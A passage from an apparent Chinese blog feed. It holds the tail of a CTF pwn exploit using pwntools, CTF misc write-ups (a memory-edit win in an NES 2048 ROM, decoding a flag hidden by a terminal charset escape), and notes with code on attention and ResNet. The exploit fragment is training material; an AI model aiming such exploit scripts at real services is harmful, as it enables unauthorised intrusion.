class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">30</span>)<br>p.interactive()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>random-leak</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023.11 月赛</title>
    <link href="/2023/11/25/ctf-misc/2023.11%E6%9C%88%E8%B5%9B/"/>
    <url>/2023/11/25/ctf-misc/2023.11%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>用linux file命令查看文件格式</p><p><code>./file.bin: NES ROM image (iNES): 2x16k PRG, 1x8k CHR [V-mirror] [SRAM]</code></p><p>用VirtualNES打开，发现是个2048游戏</p><p>游戏记录当前最高的数值，猜测把他改大一点就能胜利</p><p>打开金手指，查找2，然后在游戏里把current max is 变成4，然后更新查找，然后变成8，在更新查找…</p><p>发现6000和6058这两个地址，直接改成2048，游戏通过了拿到flag</p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@abaaba:~# ls -l<br>总计 1<br>-rw-rw-r-- 1 root root   43 11月 24 09:57 flag<br>root@kali:~/# echo $&#x27;\e(0&#x27;<br><br>⎼⎺⎺├@▒␉▒▒␉▒:·# <br>⎼⎺⎺├@▒␉▒▒␉▒:·# ␌▒├ °┌▒±<br>°┌▒±π8757␉␍88-°95␉-4233-9722-␊␉6461554▒09£<br>⎼⎺⎺├@▒␉▒▒␉▒:·# <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>$'\e(0'``` 给命令行后续的输出内容都进行了一个编码，经过在自己的kali上测试，发现1234567890-</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs echo"><br>```shell<br>▒:a<br>␉:b<br>␌:c<br>␍:d<br>␊:e<br>°:f<br>±:g<br><br>:h<br>␋:i<br>┘:j<br>┐:k<br>┌:l<br>└:m<br>┼:n<br>⎺:o<br>⎻:p<br>─:q<br>⎼:r<br>⎽:s<br>├:t<br>┤:u<br>┴:v<br>┬:w<br>│:x<br>≤:y<br>≥:z<br>π:&#123;<br>£:&#125;<br></code></pre></td></tr></table></figure><p>这样看着可能不是很直观，换成16进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x96\x92&#x27;</span>, <br><span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x89&#x27;</span>,<br><span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x8c&#x27;</span>, <br><span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x8d&#x27;</span>, <br><span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x8a&#x27;</span>, <br><span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">b&#x27;\xc2\xb0&#x27;</span>, <br><span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">b&#x27;\xc2\xb1&#x27;</span>, <br><span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\xa4&#x27;</span>, <br><span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x8b&#x27;</span>, <br><span class="hljs-string">&#x27;j&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x98&#x27;</span>, <br><span class="hljs-string">&#x27;k&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x90&#x27;</span>, <br><span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x8c&#x27;</span>, <br><span class="hljs-string">&#x27;m&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x94&#x27;</span>, <br><span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\xbc&#x27;</span>, <br><span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x8e\xba&#x27;</span>, <br><span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x8e\xbb&#x27;</span>, <br><span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x80&#x27;</span>, <br><span class="hljs-string">&#x27;r&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x8e\xbc&#x27;</span>, <br><span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x8e\xbd&#x27;</span>, <br><span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x9c&#x27;</span>, <br><span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\xa4&#x27;</span>, <br><span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\xb4&#x27;</span>, <br><span class="hljs-string">&#x27;w&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\xac&#x27;</span>, <br><span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x82&#x27;</span>, <br><span class="hljs-string">&#x27;y&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x89\xa4&#x27;</span>, <br><span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x89\xa5&#x27;</span>,<br><span class="hljs-string">&#x27;&#123;&#x27;</span>: <span class="hljs-string">b&#x27;\xcf\x80&#x27;</span>, <br><span class="hljs-string">&#x27;&#125;&#x27;</span>: <span class="hljs-string">b&#x27;\xc2\xa3&#x27;</span><br></code></pre></td></tr></table></figure><p>推测题目是在cat flag，</p><p>然后把那一行的十六进制提取出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;root@abaaba:~# ls -l\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\xe6\x80\xbb\xe8\xae\xa1 1\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;-rw-rw-r-- 1 root root   43 11\xe6\x9c\x88 24 09:57 flag\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&quot;root@kali:~/# echo $&#x27;\\e(0&#x27;\r\n&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\xe2\x8e\xbc\xe2\x8e\xba\xe2\x8e\xba\xe2\x94\x9c@\xe2\x96\x92\xe2\x90\x89\xe2\x96\x92\xe2\x96\x92\xe2\x90\x89\xe2\x96\x92:\xc2\xb7# \r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\xe2\x8e\xbc\xe2\x8e\xba\xe2\x8e\xba\xe2\x94\x9c@\xe2\x96\x92\xe2\x90\x89\xe2\x96\x92\xe2\x96\x92\xe2\x90\x89\xe2\x96\x92:\xc2\xb7# \xe2\x90\x8c\xe2\x96\x92\xe2\x94\x9c \xc2\xb0\xe2\x94\x8c\xe2\x96\x92\xc2\xb1\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\xc2\xb0\xe2\x94\x8c\xe2\x96\x92\xc2\xb1\xcf\x808757\xe2\x90\x89\xe2\x90\x8d88-\xc2\xb095\xe2\x90\x89-4233-9722-\xe2\x90\x8a\xe2\x90\x896461554\xe2\x96\x9209\xc2\xa3\r\n&#x27;</span><br></code></pre></td></tr></table></figure><p>第8次readline就是flag的内容，然后进行替换，拿到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">flag&#123;8757bd88-f95b-4233-9722-eb6461554a09&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Attention</title>
    <link href="/2023/11/22/ai/attention/"/>
    <url>/2023/11/22/ai/attention/</url>
    
    <content type="html"><![CDATA[<h3 id="Nadaraya-Watson核回归"><a href="#Nadaraya-Watson核回归" class="headerlink" title="Nadaraya-Watson核回归"></a>Nadaraya-Watson核回归</h3><p>$$<br>f(x)=\sum_{i=1}^{n} \frac{K(x-x_{i})}{\sum_{j=1}^{n}K(x-x_{j})} y_{i}<br>$$</p><p>如果核函数 $ K(x-x_{i}) $ 越大，则对应的 $y_i$ 的权重越大</p><p>核函数为 $ K(x-x_{i}) $为高斯核函数时<br>$$<br>K(u)=\frac{1}{\sqrt{2\pi} } \exp{(-\frac{u^{2}}{2})}<br>$$<br>代入会得到<br>$$<br>f(x)=\sum_{i=1}^{n} softmax(-\frac{1}{2}(x-x_i)^2)y_i<br>$$<br>而高斯核函数x与$x_i$越接近，核函数的值越大，根据前文，$y_i$的权重越大</p><p>Nadaraya-Watson核回归是一个非参模型</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>预测 $y_i = 2sin(x_i)+x_i^{0.8} +\epsilon $ 函数</p>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ResNet</title>
    <link href="/2023/11/21/ai/ResNet/"/>
    <url>/2023/11/21/ai/ResNet/</url>
    
    <content type="html"><![CDATA[<h3 id="Residual-Block作用："><a href="#Residual-Block作用：" class="headerlink" title="Residual Block作用："></a>Residual Block作用：</h3><p>总之，添加的新网络层至少不会使效果比原来差，就可以较为稳定地通过加深层数来提高模型的效果了。</p><h3 id="为什么可以避免梯度消失："><a href="#为什么可以避免梯度消失：" class="headerlink" title="为什么可以避免梯度消失："></a>为什么可以避免梯度消失：</h3><p>求梯度，根据链式法则需要一直向前累乘，只要其中的任何一个因数过小就会导致求出来的梯度很小很小，这个小梯度就算乘以再大的学习率也是无济于事</p><p>有了残差边管通过链式法则走正常路线得到的梯度多么小，两条路线相加的结果都不会小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> functional <span class="hljs-keyword">as</span> F<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> time<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Residual</span>(nn.Module): <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, input_channels, num_channels, use_1x1conv=<span class="hljs-literal">False</span>, strides=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.conv1 = nn.Conv2d(input_channels, num_channels, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>, stride=strides)<br>        self.conv2 = nn.Conv2d(num_channels, num_channels, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> use_1x1conv:<br>            self.conv3 = nn.Conv2d(input_channels, num_channels, kernel_size=<span class="hljs-number">1</span>, stride=strides)<br>        <span class="hljs-keyword">else</span>:<br>            self.conv3 = <span class="hljs-literal">None</span><br>        self.bn1 = nn.BatchNorm2d(num_channels)<br>        self.bn2 = nn.BatchNorm2d(num_channels)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, X</span>):<br>        Y = F.relu(self.bn1(self.conv1(X)))<br>        Y = self.bn2(self.conv2(Y))<br>        <span class="hljs-keyword">if</span> self.conv3:<br>            X = self.conv3(X)<br>        Y += X<br>        <span class="hljs-keyword">return</span> F.relu(Y)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">b1 = nn.Sequential(nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>, kernel_size=<span class="hljs-number">7</span>, stride=<span class="hljs-number">2</span>, padding=<span class="hljs-number">3</span>),<br>                   nn.BatchNorm2d(<span class="hljs-number">64</span>), nn.ReLU(),<br>                   nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>, padding=<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">resnet_block</span>(<span class="hljs-params">input_channels, num_channels, num_residuals,</span><br><span class="hljs-params">                 first_block=<span class="hljs-literal">False</span></span>):<br>    blk = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_residuals):<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> first_block:<br>            blk.append(Residual(input_channels, num_channels,<br>                                use_1x1conv=<span class="hljs-literal">True</span>, strides=<span class="hljs-number">2</span>))<br>        <span class="hljs-keyword">else</span>:<br>            blk.append(Residual(num_channels, num_channels))<br>    <span class="hljs-keyword">return</span> blk<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">b2 = nn.Sequential(*resnet_block(<span class="hljs-number">64</span>, <span class="hljs-number">64</span>, <span class="hljs-number">2</span>, first_block=<span class="hljs-literal">True</span>))<br>b3 = nn.Sequential(*resnet_block(<span class="hljs-number">64</span>, <span class="hljs-number">128</span>, <span class="hljs-number">2</span>))<br>b4 = nn.Sequential(*resnet_block(<span class="hljs-number">128</span>, <span class="hljs-number">256</span>, <span class="hljs-number">2</span>))<br>b5 = nn.Sequential(*resnet_block(<span class="hljs-number">256</span>, <span class="hljs-number">512</span>, <span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">net = nn.Sequential(b1, b2, b3, b4, b5,<br>                    nn.AdaptiveAvgPool2d((<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<br>                    nn.Flatten(), nn.Linear(<span class="hljs-number">512</span>, <span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lr, num_epochs, batch_size = <span class="hljs-number">0.05</span>, <span class="hljs-number">10</span>, <span class="hljs-number">256</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <span class="hljs-comment">#@save</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()), <br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br><br><span class="hljs-comment"># 不重要，不用看</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;在n个变量上累加&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算预测正确的数量&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter,device</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;计算在指定数据集上模型的精度&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># 将模型设置为评估模式</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 正确预测数、预测总数</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            X,y = X.to(device), y.to(device)<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch6</span>(<span class="hljs-params">net, trian_iter, test_iter, num_epochs, lr, device</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_weights</span>(<span class="hljs-params">m</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(m)==nn.Linear <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(m)==nn.Conv2d:<br>            nn.init.xavier_uniform_(m.weight)<br>    net.apply(init_weights)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;training on&#x27;</span> , device)<br><br>    optimizer = torch.optim.SGD(net.parameters(), lr=lr)<br>    loss = nn.CrossEntropyLoss()<br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        metric = Accumulator(<span class="hljs-number">3</span>)<br>        net = net.to(device)<br>        net.train()<br>        <span class="hljs-keyword">for</span> i, (X,y) <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">enumerate</span>(train_iter)):<br>            start = time.time()<br>            optimizer.zero_grad() <span class="hljs-comment"># 上一轮的梯度归零</span><br>            X,y = X.to(device), y.to(device)<br>            y_hat = net(X)<br>            l = loss(y_hat,y)<br>            l.backward() <span class="hljs-comment"># 反向传播得到每个参数的梯度</span><br>            optimizer.step() <span class="hljs-comment"># 参数更新</span><br>            <span class="hljs-keyword">with</span> torch.no_grad():<br>                metric.add(l * X.shape[<span class="hljs-number">0</span>], accuracy(y_hat,y), X.shape[<span class="hljs-number">0</span>])<br>            train_l = metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>]<br>            train_acc = metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br>            test_acc = evaluate_accuracy(net, test_iter,device)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;loss <span class="hljs-subst">&#123;train_l:<span class="hljs-number">.3</span>f&#125;</span>, train acc <span class="hljs-subst">&#123;train_acc:<span class="hljs-number">.3</span>f&#125;</span>,&#x27;</span> <span class="hljs-string">f&#x27;test acc <span class="hljs-subst">&#123;test_acc:<span class="hljs-number">.3</span>f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">train_iter, test_iter = load_data_fashion_mnist(batch_size,resize=<span class="hljs-number">224</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(train_iter),<span class="hljs-built_in">len</span>(test_iter))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">train_ch6(net, train_iter, test_iter, num_epochs, lr, <span class="hljs-string">&#x27;cuda:0&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">loss</span> <span class="hljs-number">1</span>.<span class="hljs-number">786</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">364</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">546</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">864</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">680</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">761</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">597</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">778</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">782</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">500</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">817</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">731</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">431</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">840</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">827</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">391</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">855</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">847</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">364</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">864</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">803</span><br><span class="hljs-attribute">loss</span> <span 